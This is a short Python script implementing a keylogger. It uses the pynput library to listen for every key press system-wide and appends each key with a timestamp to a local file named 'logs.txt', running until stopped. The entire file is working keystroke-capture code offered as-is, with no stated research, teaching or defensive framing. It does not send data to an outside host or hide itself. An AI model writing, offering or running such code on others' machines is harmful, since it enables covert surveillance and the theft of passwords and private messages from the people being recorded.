from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime as currentTime


class KeyLogger:  
    def __init__(self, PATH):
        self._keyboardListener = KeyboardListener(on_press = self.recordUserKeyboard)
        self.LogFilePath = PATH

    def recordUserKeyboard(self, pressedKey):
        with open(self.LogFilePath, "a+") as keyloggerFile: 
            keyloggerFile.write(f"{pressedKey} | {currentTime.now().strftime("%y-%m-%d  %H-%M-%S")}\n")            
    
    def setUpKeylogger(self):
        self._keyboardListener.start()
    
    def continueForLogging(self):
        self._keyboardListener.join()

if __name__ == '__main__':
    _keylogger = KeyLogger("logs.txt")
    _keylogger.setUpKeylogger()
    _keylogger.continueForLogging()